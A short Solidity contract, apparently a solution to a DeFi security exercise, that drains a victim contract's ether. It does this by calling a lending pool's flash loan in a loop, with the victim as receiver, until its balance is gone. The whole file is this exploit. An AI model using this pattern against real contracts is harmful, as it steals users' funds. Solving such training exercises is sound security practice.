pragma solidity ^0.8.0;



interface ILender {
    function flashLoan(address receiver,uint256 amount) external;
}

contract AttackerNaiveReceiver {

    address public pool;
    constructor(address _pool) {
        pool = _pool;
    }

    function attack(address victim) external{
        while (address(victim).balance > 0) {
            ILender(pool).flashLoan(victim,1 ether);
        }
    }
}